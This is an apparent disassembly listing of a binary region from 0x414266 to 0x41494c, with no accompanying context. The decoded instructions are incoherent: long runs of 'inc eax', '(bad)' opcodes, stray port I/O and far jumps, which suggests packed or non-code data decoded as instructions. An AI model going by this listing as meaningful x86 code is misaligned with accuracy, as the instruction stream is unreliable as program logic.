  414266:	add    al,0xe0
  414268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414269:	dec    edi
  41426a:	pusha  
  41426b:	fcmovb st,st(0)
  41426d:	(bad)  
  41426e:	ins    BYTE PTR es:[edi],dx
  41426f:	ret    0x4006
  414272:	dec    ebx
  414273:	bound  edi,QWORD PTR [eax]
  414275:	cld    
  414276:	inc    eax
  414277:	inc    eax
  414278:	inc    eax
  414279:	inc    eax
  41427a:	inc    eax
  41427b:	inc    eax
  41427c:	rol    DWORD PTR [eax+0x40],0xed
  414280:	imul   esp,DWORD PTR [esi],0x30
  414283:	loop   0x41428d
  414285:	clc    
  414286:	arpl   WORD PTR [ebx+0x137194be],bp
  41428c:	and    BYTE PTR [ebx+edi*8+0x402c64b0],cl
  414293:	dec    ecx
  414294:	test   eax,0x4015dc15
  414299:	inc    eax
  41429a:	add    BYTE PTR [eax+0x40],al
  41429d:	inc    eax
  41429e:	inc    eax
  41429f:	inc    eax
  4142a0:	inc    eax
  4142a1:	inc    ebx
  4142a2:	fnsave [ebp-0x14be295f]
  4142a8:	leave  
  4142a9:	nop
  4142aa:	ss and eax,0x3452292f
  4142b0:	inc    edx
  4142b1:	inc    eax
  4142b2:	inc    eax
  4142b3:	inc    eax
  4142b4:	inc    eax
  4142b5:	inc    eax
  4142b6:	inc    eax
  4142b7:	inc    eax
  4142b8:	inc    eax
  4142b9:	inc    eax
  4142ba:	inc    eax
  4142bb:	and    al,0x62
  4142bd:	jno    0x414260
  4142bf:	inc    eax
  4142c0:	fsub   QWORD PTR [esi+0x43]
  4142c3:	inc    ebx
  4142c4:	leave  
  4142c5:	inc    eax
  4142c6:	dec    ecx
  4142c7:	add    ch,BYTE PTR [eax+0x1d]
  4142ca:	inc    edx
  4142cb:	rcl    DWORD PTR [ecx+0x33],1
  4142ce:	pusha  
  4142cf:	push   eax
  4142d0:	cli    
  4142d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142d2:	add    al,0x6b
  4142d4:	mov    cl,0x52
  4142d6:	mov    dh,0xdc
  4142d8:	mov    cl,bl
  4142da:	ja     0x414327
  4142dc:	dec    esp
  4142dd:	inc    eax
  4142de:	out    dx,al
  4142df:	inc    ebp
  4142e0:	fld    QWORD PTR [eax+0x40]
  4142e3:	inc    eax
  4142e4:	inc    eax
  4142e5:	inc    eax
  4142e6:	inc    eax
  4142e7:	int3   
  4142e8:	jne    0x41432a
  4142ea:	out    0xf7,eax
  4142ec:	pop    es
  4142ed:	mov    esi,0xb3876621
  4142f2:	mov    bl,0x52
  4142f4:	in     eax,0xab
  4142f6:	pop    edx
  4142f7:	pusha  
  4142f8:	dec    edx
  4142f9:	mov    BYTE PTR [edx-0x7b],ah
  4142fc:	inc    ecx
  4142fd:	mov    esi,0x5446040
  414302:	push   ecx
  414303:	add    al,BYTE PTR [eax+0x0]
  414306:	rol    DWORD PTR [eax+0x40],0x40
  41430a:	inc    eax
  41430b:	add    BYTE PTR [eax+0x43],al
  41430e:	jno    0x414331
  414310:	popa   
  414311:	inc    eax
  414312:	xlat   BYTE PTR ds:[ebx]
  414313:	and    BYTE PTR [eax-0x519922d0],ch
  414319:	sbb    al,0xfe
  41431b:	aaa    
  41431c:	adc    ah,bl
  41431e:	cmp    al,0x41
  414320:	adc    esp,DWORD PTR [edi+0x40]
  414323:	inc    eax
  414324:	inc    eax
  414325:	inc    eax
  414326:	inc    eax
  414327:	inc    eax
  414328:	inc    eax
  414329:	inc    eax
  41432a:	inc    DWORD PTR [eax-0x8]
  41432d:	ins    BYTE PTR es:[edi],dx
  41432e:	mov    esi,0x5c1528c1
  414333:	mov    es,WORD PTR [esi-0x2d98faae]
  414339:	ds das 
  41433b:	test   al,0x15
  41433d:	dec    ecx
  41433e:	mul    DWORD PTR [edx+0x4647485f]
  414344:	dec    edi
  414345:	xor    al,0x40
  414347:	inc    eax
  414348:	inc    eax
  414349:	inc    eax
  41434a:	inc    eax
  41434b:	inc    eax
  41434c:	inc    eax
  41434d:	inc    eax
  41434e:	inc    eax
  41434f:	inc    eax
  414350:	inc    ebx
  414351:	fs retf 0x2124
  414355:	sub    dh,bl
  414357:	inc    eax
  414358:	push   edx
  414359:	inc    ebx
  41435a:	shl    BYTE PTR [edx],1
  41435c:	push   esi
  41435d:	inc    ecx
  41435e:	cli    
  41435f:	dec    eax
  414360:	in     al,0x90
  414362:	jmp    0x4143a6
  414364:	in     eax,dx
  414365:	dec    esi
  414366:	test   BYTE PTR [ecx-0x35],al
  414369:	shr    ecx,0x40
  41436c:	inc    eax
  41436d:	inc    eax
  41436e:	inc    eax
  41436f:	inc    eax
  414370:	inc    eax
  414371:	inc    eax
  414372:	inc    eax
  414373:	add    BYTE PTR [eax],dh
  414375:	pusha  
  414376:	cmp    BYTE PTR ds:0xaf43be0e,cl
  41437c:	inc    eax
  41437d:	test   eax,0x15904f28
  414382:	ror    DWORD PTR [eax+eiz*2-0x11],1
  414386:	dec    ebp
  414387:	repz arpl cx,cx
  41438a:	xor    eax,0x21457661
  41438f:	stc    
  414390:	inc    eax
  414391:	es inc eax
  414393:	inc    eax
  414394:	inc    eax
  414395:	inc    eax
  414396:	inc    eax
  414397:	inc    eax
  414398:	and    eax,0x76404040
  41439d:	aam    0x40
  41439f:	arpl   WORD PTR [eax],bp
  4143a1:	add    BYTE PTR [edx],0x51
  4143a4:	out    0xd8,al
  4143a6:	xor    eax,0x4405622b
  4143ab:	retf   
  4143ac:	and    cl,BYTE PTR [ebx-0x1e]
  4143af:	popa   
  4143b0:	inc    eax
  4143b1:	dec    edi
  4143b2:	inc    eax
  4143b3:	inc    eax
  4143b4:	inc    eax
  4143b5:	inc    eax
  4143b6:	inc    eax
  4143b7:	inc    eax
  4143b8:	inc    eax
  4143b9:	inc    eax
  4143ba:	inc    eax
  4143bb:	inc    eax
  4143bc:	adc    al,0x26
  4143be:	inc    ecx
  4143bf:	push   ecx
  4143c0:	inc    eax
  4143c1:	inc    eax
  4143c2:	push   ds
  4143c3:	repz push ebp
  4143c5:	mov    al,0x43
  4143c7:	inc    edx
  4143c8:	xor    DWORD PTR [eax+0x40],eax
  4143cb:	inc    eax
  4143cc:	inc    eax
  4143cd:	inc    eax
  4143ce:	inc    eax
  4143cf:	rol    DWORD PTR [eax+0x40],0x60
  4143d3:	addr16 clc 
  4143d5:	mov    edi,0x56e5300d
  4143da:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4143dc:	adc    BYTE PTR [eax],0xcb
  4143df:	fdivr  DWORD PTR [edx+0x42]
  4143e2:	in     al,0xa8
  4143e4:	jmp    0xa803c231
  4143e9:	sub    eax,0x5ba4522
  4143ee:	dec    ecx
  4143ef:	leave  
  4143f0:	xor    BYTE PTR [eax+0x40],al
  4143f3:	add    BYTE PTR [eax+0x40],al
  4143f6:	inc    eax
  4143f7:	inc    eax
  4143f8:	inc    eax
  4143f9:	inc    eax
  4143fa:	pop    edx
  4143fb:	add    ebp,DWORD PTR [edx]
  4143fd:	dec    bl
  4143ff:	inc    edx
  414400:	imul   eax,DWORD PTR [esi+0xd417840],0x11
  414407:	jl     0x4143d4
  414409:	mov    DWORD PTR [ecx],ebp
  41440b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41440c:	dec    esi
  41440d:	dec    edi
  41440e:	lods   al,BYTE PTR ds:[esi]
  41440f:	js     0x414475
  414411:	les    eax,FWORD PTR [eax+0x24]
  414414:	cmp    al,0xf2
  414416:	retf   
  414417:	sbb    DWORD PTR [ebp+ebp*1+0x2d],ecx
  41441b:	stos   BYTE PTR es:[edi],al
  41441c:	sub    cl,bh
  41441e:	adc    eax,0x40404040
  414423:	inc    eax
  414424:	inc    eax
  414425:	inc    eax
  414426:	inc    eax
  414427:	inc    eax
  414428:	inc    eax
  414429:	inc    edx
  41442a:	pop    esp
  41442b:	shr    BYTE PTR [eax+0x5a],0x4d
  41442f:	cld    
  414430:	dec    ebx
  414431:	jge    0x414410
  414433:	jns    0x414475
  414435:	mov    ds:0x6c184329,eax
  41443a:	fidiv  WORD PTR [ebx+0x60]
  41443d:	inc    esp
  41443e:	sub    BYTE PTR [edx+0x5a82380],ch
  414444:	jb     0x414426
  414446:	jp     0x414442
  414448:	xchg   ecx,eax
  414449:	push   ecx
  41444a:	inc    eax
  41444b:	mov    edi,0x1514bc42
  414450:	inc    eax
  414451:	inc    eax
  414452:	inc    eax
  414453:	inc    eax
  414454:	inc    eax
  414455:	inc    eax
  414456:	int3   
  414457:	jne    0x414499
  414459:	inc    edx
  41445a:	(bad)  [edx]
  41445c:	icebp  
  41445d:	pusha  
  41445e:	dec    ebp
  41445f:	out    0x4f,al
  414461:	shr    DWORD PTR [esi],0x41
  414464:	inc    edx
  414465:	push   edx
  414466:	mov    ds:0x40c10040,eax
  41446b:	inc    eax
  41446c:	inc    eax
  41446d:	inc    eax
  41446e:	add    BYTE PTR [eax+0x62],al
  414471:	repnz enter 0x2a42,0x7a
  414476:	inc    ecx
  414477:	push   esi
  414478:	push   ss
  414479:	cli    
  41447a:	inc    edx
  41447b:	jge    0x414498
  41447d:	push   ebx
  41447e:	and    al,0x61
  414480:	in     al,dx
  414481:	clc    
  414482:	inc    eax
  414483:	inc    eax
  414484:	inc    eax
  414485:	inc    eax
  414486:	inc    eax
  414487:	inc    eax
  414488:	inc    eax
  414489:	inc    eax
  41448a:	inc    DWORD PTR [eax+0x21]
  41448d:	ins    BYTE PTR es:[edi],dx
  41448e:	add    dl,BYTE PTR [ecx]
  414490:	inc    edx
  414491:	push   ebx
  414492:	(bad)  {k4}
  414497:	arpl   WORD PTR [eax+eiz*2],si
  41449a:	inc    eax
  41449b:	inc    eax
  41449c:	inc    eax
  41449d:	inc    eax
  41449e:	inc    eax
  41449f:	inc    eax
  4144a0:	inc    eax
  4144a1:	inc    eax
  4144a2:	inc    eax
  4144a3:	inc    eax
  4144a4:	inc    ebp
  4144a5:	mov    ds:0xd9b87c6c,al
  4144aa:	pop    esp
  4144ab:	and    DWORD PTR [esi+0x476de9f6],edi
  4144b1:	push   esi
  4144b2:	inc    eax
  4144b3:	push   esi
  4144b4:	test   al,0xe3
  4144b6:	arpl   WORD PTR [edi+0x626d5e43],di
  4144bc:	inc    esp
  4144bd:	mov    eax,ds:0x7530b092
  4144c2:	and    eax,0x40f42a9d
  4144c7:	inc    eax
  4144c8:	inc    eax
  4144c9:	inc    eax
  4144ca:	inc    eax
  4144cb:	inc    eax
  4144cc:	inc    eax
  4144cd:	inc    eax
  4144ce:	add    BYTE PTR [ebx-0x3d],dl
  4144d1:	aam    0x5c
  4144d3:	les    eax,FWORD PTR [edi]
  4144d5:	inc    edx
  4144d6:	adc    eax,0x7240b43d
  4144db:	inc    edi
  4144dc:	push   dx
  4144de:	je     0x41453c
  4144e0:	add    eax,0x406cde31
  4144e5:	inc    eax
  4144e6:	inc    eax
  4144e7:	inc    eax
  4144e8:	inc    eax
  4144e9:	inc    eax
  4144ea:	and    eax,0x3c404040
  4144ef:	cmp    BYTE PTR [edx],bl
  4144f1:	inc    ebx
  4144f2:	retf   
  4144f3:	ins    BYTE PTR es:[edi],dx
  4144f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144f5:	inc    edx
  4144f6:	outs   dx,BYTE PTR ds:[esi]
  4144f7:	sub    BYTE PTR [ebp-0x23],ah
  4144fa:	out    dx,eax
  4144fb:	jnp    0x414491
  4144fd:	ss inc eax
  4144ff:	push   ecx
  414500:	inc    eax
  414501:	nop
  414502:	stos   DWORD PTR es:[edi],eax
  414503:	dec    esi
  414504:	mov    al,ds:0x4021204c
  414509:	pusha  
  41450a:	inc    eax
  41450b:	inc    eax
  41450c:	inc    eax
  41450d:	inc    eax
  41450e:	inc    eax
  41450f:	inc    eax
  414510:	inc    eax
  414511:	inc    eax
  414512:	inc    eax
  414513:	inc    eax
  414514:	mov    al,0xcd
  414516:	mov    esi,0x40283a40
  41451b:	mov    DWORD PTR [esi+0x33],eax
  41451e:	cli    
  41451f:	das    
  414520:	inc    ebx
  414521:	pop    ss
  414522:	in     eax,0x40
  414524:	inc    eax
  414525:	inc    eax
  414526:	inc    eax
  414527:	inc    eax
  414528:	inc    eax
  414529:	rol    DWORD PTR [eax+0x40],0xec
  41452d:	xor    eax,0x6074e061
  414532:	xor    eax,0x43381ca9
  414537:	jno    0x414579
  414539:	mov    esp,0x40004040
  41453e:	inc    eax
  41453f:	inc    eax
  414540:	inc    eax
  414541:	inc    eax
  414542:	inc    eax
  414543:	ins    BYTE PTR es:[edi],dx
  414544:	mov    eax,0xa3206362
  414549:	xor    cl,BYTE PTR [esi+0x77]
  41454c:	or     eax,0xbf41b046
  414551:	sub    ah,cl
  414553:	(bad)  
  414554:	leave  
  414555:	xor    eax,0x48224315
  41455a:	adc    eax,0xcb409827
  41455f:	xor    BYTE PTR [ebp+0x40],ah
  414562:	inc    esi
  414563:	cmp    al,0xd
  414565:	mov    eax,0x254ad0b4
  41456a:	popa   
  41456b:	inc    eax
  41456c:	inc    eax
  41456d:	inc    eax
  41456e:	inc    eax
  41456f:	inc    eax
  414570:	inc    eax
  414571:	inc    eax
  414572:	inc    eax
  414573:	inc    eax
  414574:	inc    eax
  414575:	data16 int 0x41
  414578:	xor    eax,0x4428a840
  41457d:	adc    dh,BYTE PTR [eax+0x314260]
  414583:	inc    eax
  414584:	and    ah,bh
  414586:	dec    ecx
  414587:	mov    BYTE PTR [edx],al
  414589:	ins    BYTE PTR es:[edi],dx
  41458a:	mov    bl,0x4a
  41458c:	pusha  
  41458d:	(bad)  
  41458e:	(bad)  
  41458f:	push   edx
  414590:	int3   
  414591:	sbb    BYTE PTR [esi-0x3fd818c0],dl
  414597:	xchg   esp,eax
  414598:	int    0x9d
  41459a:	inc    eax
  41459b:	inc    eax
  41459c:	inc    eax
  41459d:	inc    eax
  41459e:	inc    eax
  41459f:	inc    eax
  4145a0:	int3   
  4145a1:	jne    0x4145e3
  4145a3:	pushf  
  4145a4:	dec    ebp
  4145a5:	xor    DWORD PTR [eax],edi
  4145a7:	scas   al,BYTE PTR es:[edi]
  4145a8:	pop    edx
  4145a9:	je     0x41458c
  4145ab:	xchg   esp,eax
  4145ac:	sub    BYTE PTR [edx+0x6d],al
  4145af:	adc    eax,0x23c573af
  4145b4:	inc    eax
  4145b5:	and    al,BYTE PTR [eax+0x0]
  4145b8:	rol    DWORD PTR [eax+0x40],0x40
  4145bc:	inc    eax
  4145bd:	add    BYTE PTR [eax+0x53],al
  4145c0:	int    0x30
  4145c2:	inc    eax
  4145c3:	into   
  4145c4:	shr    BYTE PTR [ebp+ebp*1-0x30],1
  4145c8:	(bad)  
  4145c9:	sub    eax,DWORD PTR [ecx+0x1f]
  4145cc:	dec    edi
  4145cd:	loop   0x4145eb
  4145cf:	push   cs
  4145d0:	push   ebx
  4145d1:	inc    eax
  4145d2:	inc    eax
  4145d3:	inc    eax
  4145d4:	inc    eax
  4145d5:	inc    eax
  4145d6:	inc    eax
  4145d7:	inc    eax
  4145d8:	inc    eax
  4145d9:	inc    DWORD PTR [eax-0x50]
  4145dc:	add    eax,DWORD PTR [ebx-0x23]
  4145df:	inc    eax
  4145e0:	loope  0x414595
  4145e2:	mov    eax,0x343330a8
  4145e7:	xor    eax,DWORD PTR [edi]
  4145e9:	test   al,0x6a
  4145eb:	adc    DWORD PTR [ebx-0x34],esp
  4145ee:	stos   BYTE PTR es:[edi],al
  4145ef:	inc    eax
  4145f0:	mov    eax,ds:0xb4bc4110
  4145f5:	inc    eax
  4145f6:	stos   DWORD PTR es:[edi],eax
  4145f7:	das    
  4145f8:	fwait
  4145f9:	pushf  
  4145fa:	rol    BYTE PTR [edx+0x40],0x40
  4145fe:	inc    eax
  4145ff:	inc    eax
  414600:	inc    eax
  414601:	inc    eax
  414602:	inc    eax
  414603:	inc    eax
  414604:	inc    eax
  414605:	inc    eax
  414606:	or     eax,0x7509031
  41460b:	add    eax,0x6c73c02c
  414610:	scas   eax,DWORD PTR es:[edi]
  414611:	inc    eax
  414612:	bound  eax,QWORD PTR [ebx-0x8]
  414615:	hlt    
  414616:	mov    BYTE PTR ds:0x48102cf0,dh
  41461c:	test   al,0x62
  41461e:	(bad)  
  41461f:	gs inc eax
  414621:	inc    eax
  414622:	inc    eax
  414623:	inc    eax
  414624:	inc    eax
  414625:	inc    eax
  414626:	inc    eax
  414627:	inc    eax
  414628:	add    BYTE PTR [edx+0x43ac6840],cl
  41462e:	inc    esp
  41462f:	dec    edi
  414630:	add    DWORD PTR [edi+0x25],ebx
  414633:	loope  0x414675
  414635:	jmp    0x414661
  414637:	inc    ebx
  414638:	fs mov eax,0x29024b48
  41463e:	mov    edi,0x408ab847
  414643:	loope  0x414695
  414645:	cli    
  414646:	inc    eax
  414647:	fcomp  DWORD PTR [edi+0x6e]
  41464a:	pusha  
  41464b:	dec    edi
  41464c:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41464e:	dec    edi
  41464f:	inc    eax
  414650:	inc    eax
  414651:	inc    eax
  414652:	inc    eax
  414653:	inc    eax
  414654:	inc    eax
  414655:	and    eax,0x2c404040
  41465a:	adc    DWORD PTR [edx],edx
  41465c:	inc    eax
  41465d:	mov    ds:0xe4690d41,al
  414662:	inc    ebx
  414663:	sti    
  414664:	cs es push ebp
  414667:	inc    ecx
  414668:	adc    eax,0x404033a8
  41466d:	inc    eax
  41466e:	inc    eax
  41466f:	inc    eax
  414670:	inc    eax
  414671:	inc    eax
  414672:	inc    eax
  414673:	inc    eax
  414674:	inc    eax
  414675:	lods   eax,DWORD PTR ds:[esi]
  414676:	inc    eax
  414677:	sbb    BYTE PTR [eax+esi*2],ch
  41467a:	and    al,0x10
  41467c:	enter  0x2fe9,0xe2
  414680:	dec    eax
  414681:	and    BYTE PTR [eax+eax*2+0x40],al
  414685:	inc    eax
  414686:	inc    eax
  414687:	inc    eax
  414688:	inc    eax
  414689:	rol    DWORD PTR [eax+0x40],0xbf
  41468d:	inc    eax
  41468e:	dec    ebx
  41468f:	inc    eax
  414690:	or     BYTE PTR [eax],bh
  414692:	fs lock add eax,0xfa239431
  414699:	hlt    
  41469a:	stc    
  41469b:	rol    DWORD PTR [ebx+0x40],0x40
  41469f:	add    BYTE PTR [eax+0x40],al
  4146a2:	inc    eax
  4146a3:	inc    eax
  4146a4:	inc    eax
  4146a5:	inc    eax
  4146a6:	ins    BYTE PTR es:[edi],dx
  4146a7:	and    BYTE PTR [eax+0x4a],al
  4146aa:	dec    ebp
  4146ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146ac:	adc    BYTE PTR [ecx-0x2e],ah
  4146af:	pop    ebx
  4146b0:	mul    BYTE PTR [edi-0x37]
  4146b3:	ret    0xd8a8
  4146b6:	imul   ecx,DWORD PTR [eax-0x4938fa97],0x40
  4146bd:	mov    ah,0xed
  4146bf:	jecxz  0x4146ae
  4146c1:	mov    al,ds:0x3540a27b
  4146c6:	mov    edi,0x4040b327
  4146cb:	inc    eax
  4146cc:	inc    eax
  4146cd:	inc    eax
  4146ce:	inc    eax
  4146cf:	inc    eax
  4146d0:	inc    eax
  4146d1:	inc    eax
  4146d2:	inc    eax
  4146d3:	je     0x414727
  4146d5:	adc    eax,0x6b100653
  4146da:	lods   eax,DWORD PTR ds:[esi]
  4146db:	jl     0x414749
  4146dd:	inc    edx
  4146de:	enter  0x24b2,0x1e
  4146e2:	adc    eax,DWORD PTR [eax+0x40]
  4146e5:	inc    eax
  4146e6:	inc    eax
  4146e7:	inc    eax
  4146e8:	inc    eax
  4146e9:	int3   
  4146ea:	jne    0x41472c
  4146ec:	and    dh,BYTE PTR [esi+eax*8+0x28]
  4146f0:	bound  eax,QWORD PTR [ebx+0x73]
  4146f3:	inc    ebx
  4146f4:	ins    DWORD PTR es:[edi],dx
  4146f5:	arpl   WORD PTR [ecx],sp
  4146f7:	inc    esp
  4146f8:	push   ecx
  4146f9:	xor    ebx,DWORD PTR [eax-0x5a0b2b6]
  4146ff:	(bad)  
  414700:	inc    eax
  414701:	add    cl,al
  414703:	inc    eax
  414704:	inc    eax
  414705:	inc    eax
  414706:	inc    eax
  414707:	add    BYTE PTR [eax-0x36],al
  41470a:	les    esi,FWORD PTR [esi+0x11]
  41470d:	mov    al,ds:0xb034a0ab
  414712:	inc    eax
  414713:	(bad)  
  414714:	pop    ds
  414715:	adc    edx,DWORD PTR [edx+0x43]
  414718:	and    DWORD PTR ds:0x40400331,ecx
  41471e:	inc    eax
  41471f:	inc    eax
  414720:	inc    eax
  414721:	inc    eax
  414722:	inc    eax
  414723:	inc    eax
  414724:	inc    DWORD PTR [eax-0x2e]
  414727:	inc    eax
  414728:	es stos DWORD PTR es:[edi],eax
  41472a:	and    bl,cl
  41472c:	ins    BYTE PTR es:[edi],dx
  41472d:	repnz mov eax,ds:0x629ee394
  414733:	jl     0x414724
  414735:	add    BYTE PTR [edx+0x12],0xb4
  414739:	add    eax,0x40404044
  41473e:	inc    eax
  41473f:	inc    eax
  414740:	inc    eax
  414741:	inc    eax
  414742:	inc    eax
  414743:	inc    eax
  414744:	inc    eax
  414745:	xor    al,0x43
  414747:	add    al,dh
  414749:	inc    ebx
  41474a:	add    eax,0xd144c031
  41474f:	mov    fs,WORD PTR [eax+eiz*4]
  414752:	inc    eax
  414753:	inc    eax
  414754:	inc    eax
  414755:	inc    eax
  414756:	inc    eax
  414757:	inc    eax
  414758:	inc    eax
  414759:	inc    eax
  41475a:	add    BYTE PTR [edx-0x3a],dl
  41475d:	cmp    al,0x2f
  41475f:	and    dl,bh
  414761:	cmc    
  414762:	daa    
  414763:	retf   
  414764:	daa    
  414765:	int3   
  414766:	ins    BYTE PTR es:[edi],dx
  414767:	arpl   WORD PTR [edi-0x7aa80ad],cx
  41476d:	push   edx
  41476e:	bound  esp,QWORD PTR [ecx+0x5e15df5]
  414774:	pushf  
  414775:	inc    esp
  414776:	mov    eax,0x41111e1c
  41477b:	and    edx,edx
  41477d:	inc    eax
  41477e:	inc    eax
  41477f:	inc    eax
  414780:	inc    eax
  414781:	inc    eax
  414782:	inc    eax
  414783:	and    eax,0xc0404040
  414788:	add    BYTE PTR [ecx+0x45],al
  41478b:	retf   0x6260
  41478e:	stos   DWORD PTR es:[edi],eax
  41478f:	ins    DWORD PTR es:[edi],dx
  414790:	rol    DWORD PTR [ebx-0x6e],0xd1
  414794:	and    eax,0xf8a89a51
  414799:	xor    BYTE PTR [edi+edx*4+0x5b],ah
  41479d:	push   edx
  41479e:	or     eax,0xf6c0e812
  4147a3:	add    esp,DWORD PTR [edx]
  4147a5:	leave  
  4147a6:	sar    DWORD PTR [ebx+eiz*2+0x40406740],cl
  4147ad:	inc    eax
  4147ae:	inc    eax
  4147af:	inc    eax
  4147b0:	inc    eax
  4147b1:	inc    eax
  4147b2:	inc    eax
  4147b3:	inc    eax
  4147b4:	inc    eax
  4147b5:	pop    ss
  4147b6:	mov    esp,0xc941ee42
  4147bb:	xor    DWORD PTR [ecx-0x617e514],ecx
  4147c1:	ins    BYTE PTR es:[edi],dx
  4147c2:	cli    
  4147c3:	ins    BYTE PTR es:[edi],dx
  4147c4:	mov    ?,WORD PTR [ebx-0x4f6788b6]
  4147ca:	stc    
  4147cb:	mov    WORD PTR [edi+0x1ba82041],es
  4147d1:	bound  esp,QWORD PTR [edx+0x43]
  4147d4:	dec    esp
  4147d5:	mov    cl,0x28
  4147d7:	adc    DWORD PTR [edx+0x40404043],ebp
  4147dd:	inc    eax
  4147de:	inc    eax
  4147df:	inc    eax
  4147e0:	rol    DWORD PTR [eax+0x40],0x0
  4147e4:	rol    ebx,1
  4147e6:	mov    bl,0x63
  4147e8:	mov    al,ds:0xcdc0383d
  4147ed:	ficom  WORD PTR [ecx+0x4040a0]
  4147f3:	inc    eax
  4147f4:	inc    eax
  4147f5:	inc    eax
  4147f6:	inc    eax
  4147f7:	inc    eax
  4147f8:	inc    eax
  4147f9:	or     eax,0x36176fc2
  4147fe:	mov    al,0x59
  414800:	xor    eax,DWORD PTR [edx-0x2b]
  414803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414804:	xor    al,0xb9
  414806:	cmp    BYTE PTR [eax+0x40],al
  414809:	inc    eax
  41480a:	inc    eax
  41480b:	inc    eax
  41480c:	inc    eax
  41480d:	inc    eax
  41480e:	inc    eax
  41480f:	inc    eax
  414810:	inc    eax
  414811:	icebp  
  414812:	inc    edx
  414813:	push   edx
  414814:	dec    edi
  414815:	cmp    DWORD PTR [edx-0x1c],esp
  414818:	mov    cl,0x2
  41481a:	mov    ds:0x166243a8,al
  41481f:	inc    ecx
  414820:	xlat   BYTE PTR ds:[ebx]
  414821:	icebp  
  414822:	push   ss
  414823:	dec    edi
  414824:	test   al,0xc3
  414826:	gs inc eax
  414828:	inc    eax
  414829:	inc    eax
  41482a:	inc    eax
  41482b:	inc    eax
  41482c:	inc    eax
  41482d:	int3   
  41482e:	jne    0x414870
  414830:	inc    ebx
  414831:	call   0x803d8b9c
  414836:	jne    0x414891
  414838:	xor    cl,ch
  41483a:	push   ebp
  41483b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41483c:	or     dh,bl
  41483e:	xor    al,0xdc
  414840:	cmp    al,0x7d
  414842:	push   eax
  414843:	sub    edx,ecx
  414845:	arpl   bp,ax
  414847:	and    eax,DWORD PTR [esi+edi*2+0x32]
  41484b:	jmp    0x2151:0x8333c21d
  414852:	mov    edi,0xc1004004
  414857:	inc    eax
  414858:	inc    eax
  414859:	inc    eax
  41485a:	inc    eax
  41485b:	add    BYTE PTR [eax+0x62],al
  41485e:	aam    0x52
  414860:	add    BYTE PTR [ebx+0x59],ch
  414863:	and    ah,BYTE PTR [ecx+0x41]
  414866:	retf   0xc204
  414869:	stos   BYTE PTR es:[edi],al
  41486a:	inc    ebp
  41486b:	pop    ebp
  41486c:	dec    ebp
  41486d:	and    dl,al
  41486f:	pop    edx
  414870:	sub    al,0x40
  414872:	inc    eax
  414873:	inc    eax
  414874:	inc    eax
  414875:	inc    eax
  414876:	inc    eax
  414877:	inc    eax
  414878:	inc    eax
  414879:	inc    DWORD PTR [eax-0x57]
  41487c:	retf   0x2351
  41487f:	loopne 0x4148b6
  414881:	inc    esp
  414882:	inc    ebx
  414883:	inc    ebx
  414884:	push   edx
  414885:	push   ebp
  414886:	push   0xbdc43755
  41488b:	shr    BYTE PTR [eax],cl
  41488d:	xchg   ebx,eax
  41488e:	jecxz  0x414859
  414890:	fmul   DWORD PTR [esi]
  414892:	inc    eax
  414893:	inc    eax
  414894:	inc    eax
  414895:	inc    eax
  414896:	inc    eax
  414897:	inc    eax
  414898:	inc    eax
  414899:	inc    eax
  41489a:	inc    eax
  41489b:	inc    eax
  41489c:	addr16 mov esi,0xa859662e
  4148a2:	data16 int3 
  4148a4:	mov    ah,0x98
  4148a6:	sbb    edi,DWORD PTR [edi-0x5b]
  4148a9:	inc    ecx
  4148aa:	push   eax
  4148ab:	adc    DWORD PTR [ecx+eax*2],eax
  4148ae:	repnz inc cx
  4148b1:	push   ecx
  4148b2:	jl     0x414918
  4148b4:	jge    0x41492c
  4148b6:	dec    eax
  4148b7:	jg     0x41489a
  4148b9:	les    eax,FWORD PTR [eax+0x40]
  4148bc:	inc    eax
  4148bd:	inc    eax
  4148be:	inc    eax
  4148bf:	inc    eax
  4148c0:	inc    eax
  4148c1:	inc    eax
  4148c2:	add    BYTE PTR [ecx-0x6c],ch
  4148c5:	bound  eax,QWORD PTR [ecx+0x7c]
  4148c8:	cmp    esp,DWORD PTR [esi-0x1c]
  4148cb:	or     al,0xd
  4148cd:	dec    edi
  4148ce:	inc    ebx
  4148cf:	inc    ebx
  4148d0:	adc    eax,0xcd414de3
  4148d5:	fdiv   QWORD PTR [eax]
  4148d7:	cs cmp eax,0xc0bdcc77
  4148dd:	inc    edx
  4148de:	cmp    BYTE PTR ds:0x42d66035,ch
  4148e4:	mov    ds:0x40404044,eax
  4148e9:	inc    eax
  4148ea:	inc    eax
  4148eb:	inc    eax
  4148ec:	and    eax,0x40404040
  4148f1:	retf   0x375a
  4148f4:	push   edx
  4148f5:	pusha  
  4148f6:	pop    edx
  4148f7:	ins    BYTE PTR es:[edi],dx
  4148f8:	xor    DWORD PTR ds:0x4065be13,ebx
  4148fe:	(bad)  
  4148ff:	out    dx,al
  414900:	ins    BYTE PTR es:[edi],dx
  414901:	jecxz  0x414942
  414903:	push   esp
  414904:	push   edx
  414905:	adc    BYTE PTR [edi+0x60],cl
  414908:	inc    esi
  414909:	pop    ds
  41490a:	inc    eax
  41490b:	inc    eax
  41490c:	inc    eax
  41490d:	inc    eax
  41490e:	inc    eax
  41490f:	inc    eax
  414910:	inc    eax
  414911:	inc    eax
  414912:	inc    eax
  414913:	inc    eax
  414914:	dec    ecx
  414915:	imul   esp,DWORD PTR ds:0x4ad5026b,0x6a
  41491c:	push   ebx
  41491d:	push   esp
  41491e:	data16 or dl,bh
  414921:	inc    edx
  414922:	fld    DWORD PTR [eax+0x40]
  414925:	inc    eax
  414926:	inc    eax
  414927:	inc    eax
  414928:	inc    eax
  414929:	rol    DWORD PTR [eax+0x40],0xe3
  41492d:	pop    ecx
  41492e:	daa    
  41492f:	adc    al,0x4f
  414931:	bound  eax,QWORD PTR [edx+edi*8-0x65]
  414935:	mov    cl,0xcf
  414937:	arpl   WORD PTR [ebp-0x69148997],bx
  41493d:	jecxz  0x4148e1
  41493f:	pushf  
  414940:	inc    ecx
  414941:	sbb    bh,dh
  414943:	inc    edx
  414944:	sub    dh,BYTE PTR [ebp+0x1]
  414947:	test   al,0xe8
  414949:	push   edx
  41494a:	push   eax
  41494b:	inc    eax
  41494c:	inc    eax
